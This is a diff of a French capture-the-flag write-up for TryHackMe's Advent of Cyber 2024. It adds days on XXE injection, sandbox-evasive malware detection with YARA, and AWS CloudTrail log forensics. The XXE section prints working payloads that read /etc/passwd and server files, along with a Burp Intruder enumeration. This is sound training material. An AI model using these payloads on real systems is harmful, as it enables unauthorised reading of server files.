@@ -20,6 +20,7 @@ Lien vers l'épreuve : <https://tryhackme.com/r/room/adventofcyber2024>
 * [Jour 4 : Je suis tout atomique à l'intérieur](#jour-4--je-suis-tout-atomique-à-lintérieur)
 * [Jour 5 : *SOC-mas XX-what-ee?*](#jour-5--soc-mas-xx-what-ee)
 * [Jour 6 : Si je ne peux pas trouver un gentil malware à utiliser, je ne le ferai pas](#jour-6--si-je-ne-peux-pas-trouver-un-gentil-malware-à-utiliser-je-ne-le-ferai-pas)
+* [Jour 7 : *Oh no. I'M SPEAKING IN CLOUDTRAIL!*](#jour-7--oh-no-im-speaking-in-cloudtrail)
 
 ## Jour 1 : Peut-être que la musique de SOC-mas, pensait-il, ne vient pas d'un magasin ?
 
@@ -358,6 +359,294 @@ Nous lançons la simulation, et à la fin nous avons un prompt nous proposant d'
 
 ![XXE](https://img.shields.io/badge/XXE-4d354a?logo=tryhackme)
 
+![Jour 5](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/5dbea226085ab6182a2ee0f7-1730807266344.png)
+
+L'exercice du jour consiste à injecter un XXE (**X**ML E**X**ternal **E**ntity) afin d'obtenir des informations contenues sur le serveur, mais qui devrait être inaccessibles pour les utilisateurs.
+
+Cette technique consiste à préparer une charge (*payload*) et l'ouvrir via la requête HTTP habituellement utilisée.
+
+Par exemple, si la requête initiale ressemble à :
+
+```xml
+<people>
+   <name>Glitch</name>
+   <address>Wareville</address>
+   <email>glitch@wareville.com</email>
+   <phone>111000</phone>
+</people>
+```
+
+Nous pouvons la modifier de telle façon pour pouvoir obtenir les informations des comptes présents sur le serveur :
+
+```xml
+<!DOCTYPE people[
+   <!ENTITY thmFile SYSTEM "file:///etc/passwd">
+]>
+<people>
+   <name>Glitch</name>
+   <address>&thmFile;</address>
+   <email>glitch@wareville.com</email>
+   <phone>111000</phone>
+</people>
+```
+
+En ajoutant le `DOCTYPE` et l'`ENTITY` nous pouvons ouvrir le fichier système `/etc/passwd` grâce à la variable `thmFile` que nous avons défini.
+
+Pour commencer, nous accédons au site de vente de produits de Noël, nous ajoutons un objet dans notre *wishlist* et nous nous rendons dans notre panier (*Cart*) pour valider.
+
+{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-05_cart.png" caption="Wishlist créée à valider" %}
+
+Lorsque nous procédons au *Checkout*, le site nous indique que nous venons de créer le 21ème vœu. Mais lorsque nous cliquons sur le lien, nous avons un message d'erreur indiquant que seuls les elfes du Père Noël ont accès aux vœux.
+
+{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-05_wish.png" caption="Notre panier est enregistré en tant que 21ème souhait" %}
+
+{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-05_error.png" caption="Nous n'avons pas accès à nos souhaits" %}
+
+Par chance, nous avons utilisé [Burp Suite](https://portswigger.net/burp) afin d'intercepter les requêtes {% include dictionary.html word="HTTP" %}. L'outil nous permet de constater qu'une action sur la page `/wishlist.php` utilise le format {% include dictionary.html word="XML" %}.
+
+```http
+POST /wishlist.php HTTP/1.1
+Host: 10.10.75.70
+Content-Length: 215
+Accept-Language: en-GB,en;q=0.9
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36
+Content-Type: application/xml
+Accept: */*
+Origin: http://10.10.75.70
+Referer: http://10.10.75.70/product.php
+Accept-Encoding: gzip, deflate, br
+Cookie: PHPSESSID=s362bk13rtm6nqecg4b7ifdgin
+Connection: keep-alive
+
+<wishlist>
+    <user_id>1</user_id>
+    <item>
+        <product_id>1</product_id>
+    </item>
+</wishlist>
+```
+
+Nous envoyons cette requête dans le *Repeater* de Burp, et nous modifions la partie {% include dictionary.html word="XML" %} de la manière suivante afin de vérifier si nous avons accès à notre *wishlist*:
+
+```xml
+<!--?xml version="1.0" ?-->
+<!DOCTYPE foo [<!ENTITY charge SYSTEM "/var/www/html/wishes/wish_21.txt"> ]>
+<wishlist>
+    <user_id>
+        1
+    </user_id>
+    <item>
+        <product_id>
+            &charge;
+        </product_id>
+    </item>
+</wishlist>
+```
+
+Nous obtenons bien notre panier :
+
+```http
+HTTP/1.1 200 OK
+Date: Sat, 14 Dec 2024 10:26:02 GMT
+Server: Apache/2.4.41 (Ubuntu)
+Vary: Accept-Encoding
+Content-Length: 213
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+The product ID: Wish #21
+Name: Christmas Hacker
+Address: Somewhere on Internet
+---------------------------------------
+Product: Wareville's Jolly Cap
+Quantity: 1
+---------------------------------------
+is invalid.
+```
+
+Puisqu'il y a 20 autres souhaits avant le nôtre dans le dossier, nous envoyons cette requête vers la partie *Intruder* de Burp afin d'automatiser la recherche.
+
+Nous positionnons la cible (entre les symboles `§`) sur le numéro du fichier `wish_§21§.txt`, un type de *Payload* "*Numbers*" de 1 à 20
+
+Une fois l'attaque effectuée, nous constatons que la longueur de la 15ème réponse est significativement plus longue que les autres. En l'analysant, nous y trouvons un flag :
+
+```http
+HTTP/1.1 200 OK
+Date: Sat, 14 Dec 2024 10:31:55 GMT
+Server: Apache/2.4.41 (Ubuntu)
+Vary: Accept-Encoding
+Content-Length: 224
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+The product ID: Wish #15
+Name: Mayor Malware
+Address: Test
+---------------------------------------
+Product: Waredy Cane
+Quantity: 1
+---------------------------------------
+PS: The flag is THM{[...expurgé..]}
+is invalid.
+```
+
+Nous accédons à présent à la page de `CHANGELOG` pour trouver l'origine de cette vulnérabilité, et nous constatons un commit récent accompagné d'un flag.
+
+```txt
+commit 3f786850e387550fdab836ed7e6dc881de23001b (HEAD -> master, origin/master, origin/HEAD)
+Author: Mayor Malware - Wareville <mayor@wareville.org>
+Date:   Wed Dec 4 21:24:22 2024 +0200
+
+    Fixed the wishlist.php page THM{[...expurgé...]}
+
+[...expurgé pour brièveté...]
+```
+
 ## Jour 6 : Si je ne peux pas trouver un gentil malware à utiliser, je ne le ferai pas
 
-![Log analysis](https://img.shields.io/badge/Sandboxes-314267?logo=tryhackme)
+![Sandboxes](https://img.shields.io/badge/Sandboxes-314267?logo=tryhackme)
+
+![Jour 6](https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/63588b5ef586912c7d03c4f0-1730728443161.png)
+
+Au programme de ce sixième jour, nous allons découvrir ce que nous pouvons faire pour piéger des malwares capables de détecter s'ils sont testés dans une *sandbox*, machine virtuelle sécurisée permettant de tester le fonctionnement et le comportement de programmes afin de déterminer leur dangerosité.
+
+Comme indiqué dans le déroulé de la journée, nous commençons par lancer le script `JingleBells.ps1` qui est une règle de détection [YARA](https://en.wikipedia.org/wiki/YARA) destinée à détecter les malwares analysant leur environnement et se faire discret en cas d'utilisation en *sandbox*. Un tel malware apparaîtrait fiable en *sandbox* et pourrait être distribué sur des machines physiques où il causerait des dégâts.
+
+Grâce à ce script, nous obtenons bien une alerte lorsque le malware `MerryChristmas.exe` est lancé.
+
+```txt
+YARA Result: SANDBOXDETECTED C:\Users\Administrator\AppData\Local\Temp\2\tmp176D.tmp
+Logging to file: C:\Tools\YaraMatches.txt
+Event Time: 12/14/2024 10:53:07
+Event ID: 1
+Event Record ID: 127857
+Command Line: reg  query "HKLM\Software\Microsoft\Windows\CurrentVersion" /v ProgramFilesDir
+YARA Result: SANDBOXDETECTED C:\Users\Administrator\AppData\Local\Temp\2\tmp176D.tmp
+--------------------------------------
+
+
+Id     Name            PSJobTypeName   State         HasMoreData     Location             Command
+--     ----            -------------   -----         -----------     --------             -------
+1      Job1            BackgroundJob   Running       True            localhost            ...
+YARA Result: SANDBOXDETECTED C:\Users\Administrator\AppData\Local\Temp\2\tmp1FAB.tmp
+Logging to file: C:\Tools\YaraMatches.txt
+Event Time: 12/14/2024 10:53:07
+Event ID: 1
+Event Record ID: 127856
+Command Line: C:\Windows\system32\cmd.exe /c reg query "HKLM\Software\Microsoft\Windows\CurrentVersion" /v ProgramFilesDir
+YARA Result: SANDBOXDETECTED C:\Users\Administrator\AppData\Local\Temp\2\tmp1FAB.tmp
+--------------------------------------
+3      Job3            BackgroundJob   Running       True            localhost            ...
+```
+
+{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-06_yara.png" caption="Message d'alerte et flag" %}
+
+Nous lançons à présent le programme `floss.exe` qui nous permettra d'extraire les chaînes de caractères présentes dans le malware
+
+```powershell
+floss.exe C:\Tools\Malware\MerryChristmas.exe | Out-File C:\Users\Administrator\Desktop\malstring.txt
+```
+
+En analysant le document créé à la recherche des lettres `THM` nous trouvons le flag caché dans le malware :
+
+```powershell
+Get-Content C:\Users\Administrator\Desktop\malstring.txt | Select-String THM
+THM{HiddenClue}
+```
+
+## Jour 7 : *Oh no. I'M SPEAKING IN CLOUDTRAIL!*
+
+![AWS log analysis](https://img.shields.io/badge/AWS%20log%20analysis-314267?logo=tryhackme)
+
+![Jour 7](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/5dbea226085ab6182a2ee0f7-1730384938554.png)
+
+AWS (pour *Amazon Web Services*) est un fournisseur de services basé sur le *Cloud*. Cette épreuve consiste à analyser les logs de la plateforme afin de trouver des manipulations potentiellement frauduleuses.
+
+Nous commençons l'analyse par la commande suivante, et nous y trouvons les actions menés par l'utilisateur `glitch` qui nous est indiqué comme "anormal", son adresse IP, et le service AWS permettant de se connecter à la console ainsi que la date à laquelle cette connexion est intervenue :
+
+```bash
+jq -r '["Event_Time", "Event_type", "Event_Name", "Event_Source", "User_Name", "Source_IP", "User_Agent"],(.Records[] | select(.userIdentity.userName == "glitch") | [.eventTime, .eventType, .eventName, .eventSource, .userIdentity.userName //"N/A", .sourceIPAddress //"N/A", .userAgent //"N/A"]) | @tsv' cloudtrail_log.json | column -t -s $'\t'
+
+Event_Time            Event_type        Event_Name                           Event_Source                         User_Name  Source_IP        User_Agent
+2024-11-28T15:22:12Z  AwsApiCall        HeadBucket                           s3.amazonaws.com                     glitch     [...expurgé...]  [S3Console/0.4, aws-internal/3 aws-sdk-java/1.12.750 Linux/5.10.226-192.879.amzn2int.x86_64 OpenJDK_64-Bit_Server_VM/25.412-b09 java/1.8.0_412 vendor/Oracle_Corporation cfg/retry-mode/standard]
+2024-11-28T15:22:23Z  AwsApiCall        ListObjects                          s3.amazonaws.com                     glitch     [...expurgé...]  [S3Console/0.4, aws-internal/3 aws-sdk-java/1.12.750 Linux/5.10.226-192.879.amzn2int.x86_64 OpenJDK_64-Bit_Server_VM/25.412-b09 java/1.8.0_412 vendor/Oracle_Corporation cfg/retry-mode/standard]
+2024-11-28T15:22:25Z  AwsApiCall        ListObjects                          s3.amazonaws.com                     glitch     [...expurgé...]  [S3Console/0.4, aws-internal/3 aws-sdk-java/1.12.750 Linux/5.10.226-192.879.amzn2int.x86_64 OpenJDK_64-Bit_Server_VM/25.412-b09 java/1.8.0_412 vendor/Oracle_Corporation cfg/retry-mode/standard]
+2024-11-28T15:22:39Z  AwsApiCall        [...expurgé...]                      s3.amazonaws.com                     glitch     [...expurgé...]  [Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36]
+2024-11-28T15:22:44Z  AwsApiCall        ListObjects                          s3.amazonaws.com                     glitch     [...expurgé...]  [S3Console/0.4, aws-internal/3 aws-sdk-java/1.12.750 Linux/5.10.226-193.880.amzn2int.x86_64 OpenJDK_64-Bit_Server_VM/25.412-b09 java/1.8.0_412 vendor/Oracle_Corporation cfg/retry-mode/standard]
+[...expurgé...]       AwsConsoleSignIn  ConsoleLogin                         [...expurgé...]                      glitch     [...expurgé...]  Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
+2024-11-28T15:21:57Z  AwsApiCall        GetCostAndUsage                      ce.amazonaws.com                     glitch     [...expurgé...]  Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
+2024-11-28T15:21:57Z  AwsApiCall        ListEnrollmentStatuses               cost-optimization-hub.amazonaws.com  glitch     [...expurgé...]  Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
+2024-11-28T15:21:57Z  AwsApiCall        DescribeEventAggregates              health.amazonaws.com                 glitch     [...expurgé...]  Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
+2024-11-28T15:22:12Z  AwsApiCall        ListBuckets                          s3.amazonaws.com                     glitch     [...expurgé...]  [S3Console/0.4, aws-internal/3 aws-sdk-java/1.12.750 Linux/5.10.226-193.880.amzn2int.x86_64 OpenJDK_64-Bit_Server_VM/25.412-b09 java/1.8.0_412 vendor/Oracle_Corporation cfg/retry-mode/standard]
+2024-11-28T15:22:14Z  AwsApiCall        GetStorageLensConfiguration          s3.amazonaws.com                     glitch     AWS Internal     AWS Internal
+2024-11-28T15:22:14Z  AwsApiCall        GetStorageLensDashboardDataInternal  s3.amazonaws.com                     glitch     AWS Internal     AWS Internal
+2024-11-28T15:22:13Z  AwsApiCall        GetStorageLensDashboardDataInternal  s3.amazonaws.com                     glitch     AWS Internal     AWS Internal
+2024-11-28T15:21:57Z  AwsApiCall        DescribeEventAggregates              health.amazonaws.com                 glitch     [...expurgé...]  Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
+2024-11-28T15:21:57Z  AwsApiCall        GetCostAndUsage                      ce.amazonaws.com                     glitch     [...expurgé...]  Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
+```
+
+Explications de la commande :
+
+|Commande|Utilité|
+|:--:|:--:|
+|`["Event_Time", "Event_type", "Event_Name", "Event_Source", "User_Name", "Source_IP", "User_Agent"]`| Défini les entêtes qui seront affichées|
+|`.Records[] | select(.userIdentity.userName == "glitch")`| Récupérer les entrées pour l'utilisateur `glitch`|
+|`[.eventTime, .eventType, .eventName, .eventSource, .userIdentity.userName //"N/A", .sourceIPAddress //"N/A", .userAgent //"N/A"]`|Sélectionner les informations souhaitées (remplacer par "N/A" si vide)|
+|`@tsv`|Convertir en tableau dont les colonnes sont séparées par des tabulations|
+|`column -t -s $'\t'`| Afficher sous la forme de colonnes délimitées par des tabulations|
+
+Afin de déterminer le nom de l'utilisateur créé par `mcskidy`, nous utiliserons la commande suivante afin de cibler le service `iam.amazonaws.com` qui sert à la gestion des comptes :
+
+```bash
+# Je me suis d'abord aidé de la commande ci-dessous pour savoir quel paramètre afficher
+cat cloudtrail_log.json | jq | grep -C5 requestParameters | grep -v null
+
+jq -r '["Event_Time", "Event_type", "Event_Name", "Event_Source", "User_Name", "Source_IP", "Created_username"],(.Records[] | select(.userIdentity.userName == "mcskidy") | select(.eventName == "CreateUser") | [.eventTime, .eventType, .eventName, .eventSource, .userIdentity.userName //"N/A", .sourceIPAddress //"N/A", .requestParameters.userName //"N/A"]) | @tsv' cloudtrail_log.json | column -t -s $'\t'
+
+Event_Time            Event_type  Event_Name  Event_Source       User_Name  Source_IP     Created_username
+2024-11-28T15:21:35Z  AwsApiCall  CreateUser  iam.amazonaws.com  mcskidy    53.94.201.69  glitch
+```
+
+Le compte `glitch` a été créé par `mcskidy` peut de temps avant les manipulations suspectes.
+
+En analysant ce nouveau compte, nous constatons qu'il dispose de droits élevés sur AWS :
+
+```bash
+jq -r '["Event_Time", "Event_type", "Event_Name", "Event_Source", "User_Name", "Source_IP", "Privileges"],(.Records[] | select(.eventSource == "iam.amazonaws.com") | select(.eventName == "AttachUserPolicy") | [.eventTime, .eventType, .eventName, .eventSource, .userIdentity.userName //"N/A", .sourceIPAddress //"N/A", .requestParameters.policyArn //"N/A"]) | @tsv' cloudtrail_log.json | column -t -s $'\t'
+Event_Time            Event_type  Event_Name        Event_Source       User_Name  Source_IP     Privileges
+2024-11-28T15:21:36Z  AwsApiCall  AttachUserPolicy  iam.amazonaws.com  mcskidy    53.94.201.69  arn:aws:iam::aws:policy/[...expurgé...]
+```
+
+Mais il semblerait que quelque chose ne soit pas normal : l'adresse IP utilisé par `mcskidy` en temps normal ne correspond pas à celle utilisée lors de la création de l'utilisateur `glitch`. C'est l'adresse IP de `mayor_malware` !
+
+```bash
+jq -r '["Event_Time", "Event_type", "Event_Name", "Event_Source", "User_Name", "Source_IP"],(.Records[] | select(.eventName == "ConsoleLogin") | [.eventTime,.eventType, .eventName, .eventSource, .userIdentity.userName //"N/A", .sourceIPAddress //"N/A"]) | @tsv' cloudtrail_log.json | column -t -s $'\t'
+
+Event_Time            Event_type        Event_Name    Event_Source          User_Name      Source_IP
+2024-11-28T15:18:37Z  AwsConsoleSignIn  ConsoleLogin  signin.amazonaws.com  mayor_malware  5[...expurgé...]9
+2024-11-28T15:20:54Z  AwsConsoleSignIn  ConsoleLogin  signin.amazonaws.com  mcskidy        5[...expurgé...]9
+[...expurgé...]       AwsConsoleSignIn  ConsoleLogin  signin.amazonaws.com  glitch         5[...expurgé...]9
+2024-11-22T12:20:54Z  AwsConsoleSignIn  ConsoleLogin  signin.amazonaws.com  mcskidy        3[...expurgé...]9
+2024-11-23T07:15:54Z  AwsConsoleSignIn  ConsoleLogin  signin.amazonaws.com  mcskidy        3[...expurgé...]9
+2024-11-24T05:19:31Z  AwsConsoleSignIn  ConsoleLogin  signin.amazonaws.com  mcskidy        3[...expurgé...]9
+2024-11-25T01:11:32Z  AwsConsoleSignIn  ConsoleLogin  signin.amazonaws.com  mcskidy        3[...expurgé...]9
+2024-11-26T19:22:05Z  AwsConsoleSignIn  ConsoleLogin  signin.amazonaws.com  mcskidy        3[...expurgé...]9
+2024-11-22T11:08:03Z  AwsConsoleSignIn  ConsoleLogin  signin.amazonaws.com  mayor_malware  5[...expurgé...]9
+2024-11-23T07:19:01Z  AwsConsoleSignIn  ConsoleLogin  signin.amazonaws.com  mayor_malware  5[...expurgé...]9
+2024-11-24T02:28:17Z  AwsConsoleSignIn  ConsoleLogin  signin.amazonaws.com  mayor_malware  5[...expurgé...]9
+2024-11-25T21:48:22Z  AwsConsoleSignIn  ConsoleLogin  signin.amazonaws.com  mayor_malware  5[...expurgé...]9
+2024-11-26T22:55:51Z  AwsConsoleSignIn  ConsoleLogin  signin.amazonaws.com  mayor_malware  5[...expurgé...]9
+```
+
+Enfin, pour obtenir le numéro de compte de Mayor Malware, nous utilisons une {% include dictionary.html word="regex" %} permettant de trouver les informations au bon format (4 ensembles de 4 chiffres, ensembles séparés par des espaces) :
+
+```bash
+grep -E '([0-9]{4}\s){3}[0-9]{4}' rds.log | grep -i 'mayor'
+2024-11-28T15:23:02.605Z 2024-11-28T15:23:02.605700Z      263 Query	INSERT INTO wareville_bank_transactions (account_number, account_owner, amount) VALUES ('[...expurgé...]', 'Mayor Malware', 193.45)
+2024-11-28T15:23:02.792Z 2024-11-28T15:23:02.792161Z      263 Query	INSERT INTO wareville_bank_transactions (account_number, account_owner, amount) VALUES ('[...expurgé...]', 'Mayor Malware', 998.13)
+2024-11-28T15:23:02.976Z 2024-11-28T15:23:02.976943Z      263 Query	INSERT INTO wareville_bank_transactions (account_number, account_owner, amount) VALUES ('[...expurgé...]', 'Mayor Malware', 865.75)
+2024-11-28T15:23:03.161Z 2024-11-28T15:23:03.161700Z      263 Query	INSERT INTO wareville_bank_transactions (account_number, account_owner, amount) VALUES ('[...expurgé...]', 'Mayor Malware', 409.54)
+[...expurgé...]
+```
